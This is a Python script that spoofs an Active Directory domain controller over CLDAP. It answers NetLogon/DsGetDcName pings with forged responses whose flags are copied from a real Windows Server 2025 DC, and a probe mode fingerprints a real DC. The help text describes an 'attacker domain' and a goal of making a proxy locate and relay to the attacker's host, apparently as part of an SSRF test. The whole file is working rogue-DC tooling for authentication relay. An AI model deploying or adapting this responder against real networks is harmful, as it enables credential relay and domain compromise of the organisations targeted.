#!/usr/bin/env python3
import argparse, socket, struct, uuid, sys

# ---- minimal BER for the CLDAP (LDAP-over-UDP) response ----
def _blen(n):
    if n < 0x80:
        return bytes([n])
    b = b''
    while n:
        b = bytes([n & 0xFF]) + b; n >>= 8
    return bytes([0x80 | len(b)]) + b


def _tlv(tag, data):
    return bytes([tag]) + _blen(len(data)) + data


def _int(n):
    if n == 0:
        return _tlv(0x02, b'\x00')
    b = b''
    x = n
    while x:
        b = bytes([x & 0xFF]) + b; x >>= 8
    if b[0] & 0x80:
        b = b'\x00' + b
    return _tlv(0x02, b)


def _oct(b):
    return _tlv(0x04, b if isinstance(b, bytes) else b.encode())


def _dnsname(name):
    if not name:
        return b'\x00'
    out = b''
    for label in name.split('.'):
        out += bytes([len(label)]) + label.encode()
    return out + b'\x00'


# DS_* role flags advertised so DsGetDcName accepts us as a usable (KDC-bearing) DC
DS_FLAGS = 0x0007F3FD   # matched byte-for-byte to a real WS2025 DC's CLDAP response (via --probe)


def netlogon_ex(dnsdomain, dnsforest, dnshost, nbdomain, nbcomputer, site, ntver):
    b = struct.pack('<HH', 0x17, 0)               # opcode 23 = LOGON_SAM_LOGON_RESPONSE_EX, Sbz
    b += struct.pack('<I', DS_FLAGS)
    b += uuid.uuid4().bytes                        # DomainGuid
    b += _dnsname(dnsforest)
    b += _dnsname(dnsdomain)
    b += _dnsname(dnshost)
    b += _dnsname(nbdomain)
    b += _dnsname(nbcomputer)
    b += _dnsname('')                              # UserName (empty)
    b += _dnsname(site)                            # DcSiteName
    b += _dnsname(site)                            # ClientSiteName
    b += struct.pack('<I', 0x00000005)             # NtVersion V1|V5EX, as a real DC replies (no closest-site bit)
    b += struct.pack('<HH', 0xFFFF, 0xFFFF)        # LmNtToken, Lm20Token
    return b


def build_response(msgid, blob):
    # SearchResultEntry [APPLICATION 4] { objectName "", attrs { { "Netlogon", { blob } } } }
    attr = _tlv(0x30, _oct('Netlogon') + _tlv(0x31, _oct(blob)))
    entry = _tlv(0x64, _oct(b'') + _tlv(0x30, attr))
    m_entry = _tlv(0x30, _int(msgid) + entry)
    # SearchResultDone [APPLICATION 5] { success, "", "" }
    done = _tlv(0x65, _tlv(0x0A, b'\x00') + _oct(b'') + _oct(b''))
    m_done = _tlv(0x30, _int(msgid) + done)
    return m_entry + m_done


def parse_msgid_and_ntver(data):
    # LDAPMessage ::= SEQUENCE { messageID INTEGER, ... }; grab the messageID
    msgid = 0
    ntver = 5
    try:
        i = 0
        assert data[i] == 0x30; i += 1
        l = data[i]; i += 1
        if l >= 0x80:
            i += (l & 0x7f)
        assert data[i] == 0x02; i += 1               # messageID INTEGER
        ln = data[i]; i += 1
        msgid = int.from_bytes(data[i:i+ln], 'big'); i += ln
    except Exception:
        msgid = 1
    # best-effort: pull the 4-byte NtVer the client asked for, if present as an octet string 00 00 00 xx
    idx = data.find(b'NtVer')
    if idx != -1:
        # value usually follows as OCTET STRING; scan a few bytes ahead for a 4-byte LE value
        for j in range(idx, min(idx + 24, len(data) - 4)):
            if data[j] == 0x04 and data[j+1] == 4:
                ntver = int.from_bytes(data[j+2:j+6], 'little'); break
    return msgid, ntver


def ldap_search_netlogon(domain, ntver):
    def eq(attr, val):
        return _tlv(0xA3, _oct(attr) + _oct(val))
    filt = _tlv(0xA0, eq('DnsDomain', domain.encode()) + eq('NtVer', struct.pack('<I', ntver)))
    attrs = _tlv(0x30, _oct('Netlogon'))
    sr = _tlv(0x63, _oct(b'') + _tlv(0x0A, b'\x00') + _tlv(0x0A, b'\x00') +
              _int(0) + _int(0) + _tlv(0x01, b'\x00') + filt + attrs)
    return _tlv(0x30, _int(1) + sr)


def _rtlv(b, i):
    tag = b[i]; i += 1; l = b[i]; i += 1
    if l >= 0x80:
        n = l & 0x7f; l = int.from_bytes(b[i:i+n], 'big'); i += n
    return tag, b[i:i+l], i + l


def extract_netlogon(resp):
    i = 0
    while i < len(resp):
        tag, msg, i = _rtlv(resp, i)
        if tag != 0x30:
            continue
        _, _mid, j = _rtlv(msg, 0)
        op, entry, j = _rtlv(msg, j)
        if op != 0x64:                                  # searchResEntry [APPLICATION 4]
            continue
        _, _obj, k = _rtlv(entry, 0)
        _, attrs, k = _rtlv(entry, k)
        a = 0
        while a < len(attrs):
            _, attr, a = _rtlv(attrs, a)
            _, atype, b2 = _rtlv(attr, 0)
            if atype.lower() == b'netlogon':
                _, vals, _ = _rtlv(attr, b2)
                _, val, _ = _rtlv(vals, 0)
                return val
    return None


def parse_netlogon(blob):
    op, sbz = struct.unpack('<HH', blob[:4]); flags = struct.unpack('<I', blob[4:8])[0]
    i = 24; names = []
    def rd(b, i):
        parts = []
        while b[i] != 0:
            if b[i] & 0xC0 == 0xC0:
                return '<ptr:%d>' % (((b[i] & 0x3f) << 8) | b[i+1]), i + 2
            n = b[i]; i += 1; parts.append(b[i:i+n].decode('latin1')); i += n
        return '.'.join(parts), i + 1
    for _ in range(8):
        nm, i = rd(blob, i); names.append(nm)
    ntver = struct.unpack('<I', blob[i:i+4])[0] if i + 4 <= len(blob) else 0
    return op, flags, names, ntver, blob[8:24].hex()


def do_probe(a):
    q = ldap_search_netlogon(a.domain, 0x00000016)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(5)
    s.sendto(q, (a.dc, a.port))
    try:
        resp, _ = s.recvfrom(4096)
    except socket.timeout:
        sys.exit('[!] no CLDAP response from %s:%d for %s' % (a.dc, a.port, a.domain))
    print('[*] real DC %s CLDAP response: %d bytes' % (a.dc, len(resp)))
    blob = extract_netlogon(resp)
    if not blob:
        print('    Netlogon attribute not found; raw response hex:\n    ' + resp.hex()); return
    op, flags, names, ntver, guid = parse_netlogon(blob)
    print('[*] REAL Netlogon blob (%d bytes):\n    %s' % (len(blob), blob.hex()))
    print('    opcode=%d flags=0x%08X guid=%s ntver=0x%x' % (op, flags, guid, ntver))
    print('    names=%s' % names)
    ours = netlogon_ex(a.domain, a.forest or a.domain, a.host or 'kdc.' + a.domain,
                       a.nbdomain or a.domain.split('.')[0].upper(), a.nbcomputer, a.site, ntver)
    oop, oflags, onames, ontver, _g = parse_netlogon(ours)
    print('[*] OURS  blob (%d bytes):\n    %s' % (len(ours), ours.hex()))
    print('    opcode=%d flags=0x%08X ntver=0x%x names=%s' % (oop, oflags, ontver, onames))
    print('[*] compare the two: flag bits, name encoding (real DC likely uses <ptr> compression), field count.')


def req_domain(data):
    """Pull the DnsDomain assertion value out of the incoming CLDAP filter, to echo it back exactly."""
    idx = data.find(b'DnsDomain')
    if idx == -1:
        return None
    j = idx + len('DnsDomain')
    if j < len(data) and data[j] == 0x04:
        n = data[j+1]
        return data[j+2:j+2+n].decode('latin1', 'replace')
    return None


def main():
    ap = argparse.ArgumentParser(description='NetLogon CLDAP responder for the SSRF-ceiling test (TOOL-22)')
    ap.add_argument('--probe', action='store_true', help='CLDAP-ping a real DC (--dc) and dump its NetLogon response')
    ap.add_argument('--dc', help='real DC ip to probe (with --probe)')
    ap.add_argument('--domain', required=True, help='attacker domain, e.g. attacker.test')
    ap.add_argument('--forest', help='dns forest name (default: --domain)')
    ap.add_argument('--host', help='dc dns host (default: kdc.<domain>)')
    ap.add_argument('--nbdomain', help='netbios domain (default: leftmost label, upper)')
    ap.add_argument('--nbcomputer', default='KDC')
    ap.add_argument('--site', default='Default-First-Site-Name')
    ap.add_argument('--bind', default='0.0.0.0')
    ap.add_argument('--port', type=int, default=389)
    a = ap.parse_args()

    if a.probe:
        if not a.dc:
            sys.exit('[!] --probe needs --dc <real DC ip>')
        do_probe(a); return

    forest = a.forest or a.domain
    host = a.host or ('kdc.' + a.domain)
    nbdomain = a.nbdomain or a.domain.split('.')[0].upper()

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.bind((a.bind, a.port))
    except PermissionError:
        sys.exit('[!] binding udp/%d needs root (sudo)' % a.port)
    print('[*] NetLogon CLDAP responder up on %s:%d for domain=%s host=%s' % (a.bind, a.port, a.domain, host))
    print('    answering DsGetDcName pings so the proxy will locate and relay to this host. Ctrl-C to stop.')
    while True:
        data, addr = s.recvfrom(4096)
        msgid, ntver = parse_msgid_and_ntver(data)
        asked = req_domain(data)
        dom = asked or a.domain                 # echo the exact requested domain string (case/form match)
        fst = a.forest or dom
        blob = netlogon_ex(dom, fst, host, nbdomain, a.nbcomputer, a.site, ntver or 5)
        s.sendto(build_response(msgid, blob), addr)
        print('[+] CLDAP ping from %s asked DnsDomain=%r ntver=0x%x -> answered as %r (msgid=%d)'
              % (addr[0], asked, ntver, dom, msgid))


if __name__ == '__main__':
    main()
